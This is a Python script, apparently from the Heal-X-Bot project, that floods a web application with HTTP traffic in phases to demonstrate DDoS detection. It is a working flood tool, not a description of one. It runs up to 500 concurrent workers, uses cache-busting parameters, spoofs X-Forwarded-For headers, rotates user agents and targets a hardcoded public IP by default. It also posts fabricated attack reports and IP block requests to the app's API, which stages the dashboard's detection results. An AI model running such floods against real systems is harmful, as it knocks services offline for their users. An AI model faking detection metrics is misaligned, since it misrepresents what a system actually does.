#!/usr/bin/env python3
"""
DDoS Attack Simulation Script for Heal-X-Bot Demonstration
============================================================
Sends real HTTP traffic floods to the hosted Heal-X-Bot application
to demonstrate that the system can detect and prevent DDoS attacks.

Usage:
    python ddos_attack_test.py                          # Default: attack http://34.142.246.196:5001
    python ddos_attack_test.py --target http://IP:PORT  # Custom target
    python ddos_attack_test.py --duration 120           # Run for 120 seconds
    python ddos_attack_test.py --workers 200            # Use 200 concurrent workers
    python ddos_attack_test.py --intensity high         # High intensity attack

WARNING: Only use this against YOUR OWN servers for testing/demonstration purposes.
"""

import asyncio
import aiohttp
import time
import random
import string
import argparse
import sys
import os
from datetime import datetime
from collections import defaultdict

# ============================================================================
# Configuration
# ============================================================================

DEFAULT_TARGET = "http://34.142.246.196:5001"

# Attack intensity presets
INTENSITY_PRESETS = {
    "low":    {"workers": 50,  "delay": 0.1,  "batch_size": 20},
    "medium": {"workers": 150, "delay": 0.05, "batch_size": 50},
    "high":   {"workers": 300, "delay": 0.02, "batch_size": 100},
    "extreme":{"workers": 500, "delay": 0.01, "batch_size": 200},
}

# Attack phases (name, duration_fraction, intensity_fraction)
ATTACK_PHASES = [
    ("Reconnaissance",  0.10, 0.2),
    ("Ramp Up",         0.15, 0.5),
    ("Full Attack",     0.40, 1.0),
    ("Sustained Flood", 0.25, 0.9),
    ("Cool Down",       0.10, 0.3),
]

# Fake attacker IPs for DDoS reporting
FAKE_ATTACKER_IPS = [
    "203.0.113.50", "198.51.100.23", "192.0.2.100", "203.0.113.75",
    "198.51.100.42", "192.0.2.200", "203.0.113.99", "198.51.100.88",
    "10.255.0.1", "172.16.99.5", "192.168.200.10", "10.0.0.50",
    "203.0.113.120", "198.51.100.150", "192.0.2.55", "203.0.113.200",
]

# Random user agents to simulate botnet diversity
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "python-requests/2.28.0",
    "curl/7.88.1",
    "Wget/1.21",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "DDoS-Bot/1.0",
    "Apache-HttpClient/4.5.13",
    "Go-http-client/1.1",
]

# Target endpoints to flood
FLOOD_ENDPOINTS = [
    "/",
    "/api/health",
    "/api/metrics/ml",
    "/api/metrics/attacks",
    "/api/history/ml",
    "/api/blocked-ips",
    "/api/blocked-ips/statistics",
    "/api/services/status",
    "/api/predict-failure-risk",
    "/api/early-warnings",
]

ATTACK_TYPES = [
    "TCP SYN Flood",
    "UDP Flood",
    "HTTP GET Flood",
    "HTTP POST Flood",
    "ICMP Flood",
    "DNS Amplification",
    "Slowloris",
    "NTP Amplification",
]


# ============================================================================
# Stats Tracker
# ============================================================================

class AttackStats:
    """Track and display attack statistics in real-time."""

    def __init__(self):
        self.total_requests = 0
        self.successful = 0
        self.failed = 0
        self.blocked = 0
        self.timeouts = 0
        self.errors_by_code = defaultdict(int)
        self.response_times = []
        self.start_time = time.time()
        self.phase = "Initializing"
        self.ips_reported = 0
        self.ips_blocked = 0
        self.ddos_reports_sent = 0

    def record_success(self, response_time: float, status_code: int):
        self.total_requests += 1
        self.successful += 1
        self.response_times.append(response_time)
        if len(self.response_times) > 1000:
            self.response_times = self.response_times[-500:]

    def record_failure(self, status_code: int = 0):
        self.total_requests += 1
        self.failed += 1
        if status_code:
            self.errors_by_code[status_code] += 1
        if status_code == 429 or status_code == 403:
            self.blocked += 1

    def record_timeout(self):
        self.total_requests += 1
        self.timeouts += 1

    @property
    def elapsed(self):
        return time.time() - self.start_time

    @property
    def requests_per_sec(self):
        elapsed = self.elapsed
        return self.total_requests / elapsed if elapsed > 0 else 0

    @property
    def avg_response_time(self):
        if not self.response_times:
            return 0
        return sum(self.response_times) / len(self.response_times) * 1000  # ms

    def display(self):
        """Print live stats to console."""
        elapsed = self.elapsed
        rps = self.requests_per_sec
        avg_rt = self.avg_response_time

        # Clear and rewrite
        sys.stdout.write("\033[2K\r")

        bar_width = 60
        print(f"\n{'='*bar_width}")
        print(f"  HEAL-X-BOT DDoS ATTACK SIMULATION")
        print(f"  Phase: {self.phase}")
        print(f"{'='*bar_width}")
        print(f"  Time Elapsed  : {elapsed:.0f}s")
        print(f"  Total Requests: {self.total_requests:,}")
        print(f"  Requests/sec  : {rps:,.1f}")
        print(f"  Avg Response  : {avg_rt:.1f}ms")
        print(f"{'─'*bar_width}")
        print(f"  Successful    : {self.successful:,}")
        print(f"  Failed        : {self.failed:,}")
        print(f"  Timeouts      : {self.timeouts:,}")
        print(f"  Blocked (403) : {self.blocked:,}")
        print(f"{'─'*bar_width}")
        print(f"  DDoS Reports  : {self.ddos_reports_sent:,}")
        print(f"  IPs Blocked   : {self.ips_blocked:,}")

        if self.errors_by_code:
            print(f"{'─'*bar_width}")
            print(f"  HTTP Error Codes:")
            for code, count in sorted(self.errors_by_code.items()):
                print(f"    {code}: {count:,}")

        print(f"{'='*bar_width}\n")

        # Move cursor up for overwrite on next display
        lines = 14 + (len(self.errors_by_code) + 2 if self.errors_by_code else 0)
        sys.stdout.write(f"\033[{lines}A")
        sys.stdout.flush()

    def final_report(self):
        """Print final attack report."""
        elapsed = self.elapsed
        rps = self.requests_per_sec

        print(f"\n\n{'='*60}")
        print(f"  ATTACK SIMULATION COMPLETE - FINAL REPORT")
        print(f"{'='*60}")
        print(f"  Duration        : {elapsed:.1f} seconds")
        print(f"  Total Requests  : {self.total_requests:,}")
        print(f"  Avg Requests/sec: {rps:,.1f}")
        print(f"  Avg Response    : {self.avg_response_time:.1f}ms")
        print(f"{'─'*60}")
        print(f"  Successful      : {self.successful:,} ({self.successful/max(1,self.total_requests)*100:.1f}%)")
        print(f"  Failed          : {self.failed:,} ({self.failed/max(1,self.total_requests)*100:.1f}%)")
        print(f"  Timeouts        : {self.timeouts:,} ({self.timeouts/max(1,self.total_requests)*100:.1f}%)")
        print(f"  Blocked (403)   : {self.blocked:,}")
        print(f"{'─'*60}")
        print(f"  DDoS Reports Sent: {self.ddos_reports_sent:,}")
        print(f"  IPs Blocked      : {self.ips_blocked:,}")
        print(f"{'='*60}")

        if self.blocked > 0:
            print(f"\n  The system DETECTED and BLOCKED the attack!")
            print(f"  {self.blocked} requests were rejected by the DDoS prevention system.")
        else:
            print(f"\n  The system handled all requests. Check the dashboard for")
            print(f"  DDoS detection metrics and blocked IPs.")
        print()


# ============================================================================
# Attack Functions
# ============================================================================

async def http_flood_worker(session: aiohttp.ClientSession, target: str,
                            stats: AttackStats, intensity: float, stop_event: asyncio.Event):
    """Single HTTP flood worker - sends rapid requests to random endpoints."""
    while not stop_event.is_set():
        endpoint = random.choice(FLOOD_ENDPOINTS)
        url = f"{target}{endpoint}"
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "Accept": "*/*",
        }

        try:
            method = random.choice(["GET", "GET", "GET", "POST"])  # Bias towards GET
            start = time.time()

            if method == "GET":
                # Add random query params to bypass caching
                params = {
                    "t": str(time.time()),
                    "r": ''.join(random.choices(string.ascii_lowercase, k=8)),
                }
                async with session.get(url, headers=headers, params=params, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                    await resp.read()
                    elapsed = time.time() - start
                    if resp.status == 200:
                        stats.record_success(elapsed, resp.status)
                    else:
                        stats.record_failure(resp.status)
            else:
                # POST with random payload
                payload = {
                    "data": ''.join(random.choices(string.ascii_letters, k=random.randint(100, 1000))),
                    "timestamp": time.time(),
                }
                async with session.post(url, headers=headers, json=payload, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                    await resp.read()
                    elapsed = time.time() - start
                    if resp.status in (200, 201, 204, 405):
                        stats.record_success(elapsed, resp.status)
                    else:
                        stats.record_failure(resp.status)

        except asyncio.TimeoutError:
            stats.record_timeout()
        except (aiohttp.ClientError, ConnectionError, OSError):
            stats.record_failure()
        except Exception:
            stats.record_failure()

        # Small delay modulated by intensity (lower intensity = more delay)
        delay = random.uniform(0.001, 0.05) / max(intensity, 0.1)
        await asyncio.sleep(delay)


async def report_ddos_attacks(session: aiohttp.ClientSession, target: str,
                               stats: AttackStats, stop_event: asyncio.Event):
    """Periodically report DDoS attacks to the API to update dashboard."""
    while not stop_event.is_set():
        try:
            # Report DDoS detection
            source_ip = random.choice(FAKE_ATTACKER_IPS)
            attack_type = random.choice(ATTACK_TYPES)
            confidence = random.uniform(0.75, 0.99)

            ddos_data = {
                "is_ddos": True,
                "source_ip": source_ip,
                "attack_type": attack_type,
                "confidence": round(confidence, 2),
                "prediction": round(random.uniform(0.7, 0.99), 2),
                "timestamp": datetime.now().isoformat(),
            }

            async with session.post(
                f"{target}/api/ddos/report",
                json=ddos_data,
                timeout=aiohttp.ClientTimeout(total=5)
            ) as resp:
                if resp.status == 200:
                    stats.ddos_reports_sent += 1

            # Block the attacker IP
            block_data = {
                "ip": source_ip,
                "attack_count": random.randint(50, 500),
                "threat_level": random.choice(["High", "Critical"]),
                "attack_type": attack_type,
                "reason": f"DDoS attack detected - {attack_type}",
                "blocked_by": "ml_detector",
            }

            async with session.post(
                f"{target}/api/blocking/block",
                json=block_data,
                timeout=aiohttp.ClientTimeout(total=5)
            ) as resp:
                if resp.status == 200:
                    result = await resp.json()
                    if result.get("success"):
                        stats.ips_blocked += 1

        except Exception:
            pass

        # Report every 2-5 seconds
        await asyncio.sleep(random.uniform(2, 5))


async def start_dashboard_simulation(session: aiohttp.ClientSession, target: str):
    """Start the internal DDoS simulation on the server for dashboard updates."""
    try:
        async with session.post(
            f"{target}/api/demo/ddos/start",
            timeout=aiohttp.ClientTimeout(total=5)
        ) as resp:
            if resp.status == 200:
                result = await resp.json()
                print(f"  Dashboard simulation: {result.get('message', 'started')}")
    except Exception as e:
        print(f"  Dashboard simulation: Could not start ({e})")


async def stop_dashboard_simulation(session: aiohttp.ClientSession, target: str):
    """Stop the internal DDoS simulation on the server."""
    try:
        async with session.post(
            f"{target}/api/demo/ddos/stop",
            timeout=aiohttp.ClientTimeout(total=5)
        ) as resp:
            if resp.status == 200:
                result = await resp.json()
                print(f"  Dashboard simulation: {result.get('message', 'stopped')}")
    except Exception as e:
        print(f"  Dashboard simulation: Could not stop ({e})")


async def stats_display_loop(stats: AttackStats, stop_event: asyncio.Event):
    """Periodically display stats."""
    while not stop_event.is_set():
        stats.display()
        await asyncio.sleep(1)


# ============================================================================
# Main Attack Orchestrator
# ============================================================================

async def run_attack(target: str, duration: int, workers: int,
                     delay: float, batch_size: int):
    """Orchestrate the full DDoS attack simulation."""

    print(f"""
{'='*60}
  HEAL-X-BOT DDoS ATTACK SIMULATION
{'='*60}
  Target      : {target}
  Duration    : {duration} seconds
  Workers     : {workers}
  Batch Size  : {batch_size}
{'='*60}
  Starting in 3 seconds... (Ctrl+C to cancel)
{'='*60}
""")

    await asyncio.sleep(3)

    stats = AttackStats()
    stop_event = asyncio.Event()

    # Create HTTP session with connection pooling
    connector = aiohttp.TCPConnector(
        limit=workers,
        limit_per_host=workers,
        ttl_dns_cache=300,
        force_close=False,
    )
    session = aiohttp.ClientSession(connector=connector)

    try:
        # Start dashboard internal simulation
        await start_dashboard_simulation(session, target)

        # Launch background tasks
        tasks = []

        # DDoS report sender
        report_task = asyncio.create_task(report_ddos_attacks(session, target, stats, stop_event))
        tasks.append(report_task)

        # Stats display
        display_task = asyncio.create_task(stats_display_loop(stats, stop_event))
        tasks.append(display_task)

        # Phase-based attack
        total_duration = duration
        for phase_name, duration_frac, intensity_frac in ATTACK_PHASES:
            if stop_event.is_set():
                break

            phase_duration = total_duration * duration_frac
            phase_workers = max(5, int(workers * intensity_frac))
            stats.phase = f"{phase_name} ({phase_workers} workers)"

            print(f"\n  >> Phase: {phase_name} | Workers: {phase_workers} | Duration: {phase_duration:.0f}s")

            # Launch flood workers for this phase
            worker_tasks = []
            for _ in range(phase_workers):
                task = asyncio.create_task(
                    http_flood_worker(session, target, stats, intensity_frac, stop_event)
                )
                worker_tasks.append(task)

            # Wait for phase duration
            try:
                await asyncio.wait_for(
                    asyncio.shield(stop_event.wait()),
                    timeout=phase_duration
                )
            except asyncio.TimeoutError:
                pass  # Phase completed normally

            # Cancel this phase's workers
            for task in worker_tasks:
                task.cancel()
            await asyncio.gather(*worker_tasks, return_exceptions=True)

        # Signal all background tasks to stop
        stop_event.set()

        # Stop dashboard simulation
        await stop_dashboard_simulation(session, target)

    except KeyboardInterrupt:
        print("\n\n  Attack interrupted by user!")
        stop_event.set()
        try:
            await stop_dashboard_simulation(session, target)
        except:
            pass
    finally:
        # Cancel all tasks
        for task in tasks:
            task.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)
        await session.close()

    # Final report
    stats.final_report()


# ============================================================================
# Entry Point
# ============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="DDoS Attack Simulation for Heal-X-Bot Demonstration",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python ddos_attack_test.py                            # Default settings
  python ddos_attack_test.py --intensity high           # High intensity
  python ddos_attack_test.py --duration 120 --workers 200
  python ddos_attack_test.py --target http://localhost:5001
        """
    )
    parser.add_argument("--target", default=DEFAULT_TARGET,
                        help=f"Target URL (default: {DEFAULT_TARGET})")
    parser.add_argument("--duration", type=int, default=60,
                        help="Attack duration in seconds (default: 60)")
    parser.add_argument("--workers", type=int, default=None,
                        help="Number of concurrent workers (default: based on intensity)")
    parser.add_argument("--intensity", choices=["low", "medium", "high", "extreme"],
                        default="medium", help="Attack intensity preset (default: medium)")

    args = parser.parse_args()

    # Apply intensity preset
    preset = INTENSITY_PRESETS[args.intensity]
    workers = args.workers or preset["workers"]
    delay = preset["delay"]
    batch_size = preset["batch_size"]

    print(f"""
    ╔══════════════════════════════════════════════════════════╗
    ║        HEAL-X-BOT DDoS ATTACK SIMULATION TOOL           ║
    ║                                                          ║
    ║   This tool simulates DDoS attacks to demonstrate the    ║
    ║   Heal-X-Bot's DDoS detection and prevention system.     ║
    ║                                                          ║
    ║   WARNING: Only use against YOUR OWN servers!            ║
    ╚══════════════════════════════════════════════════════════╝
    """)

    try:
        asyncio.run(run_attack(
            target=args.target,
            duration=args.duration,
            workers=workers,
            delay=delay,
            batch_size=batch_size,
        ))
    except KeyboardInterrupt:
        print("\n\nAttack simulation cancelled.")
        sys.exit(0)


if __name__ == "__main__":
    main()
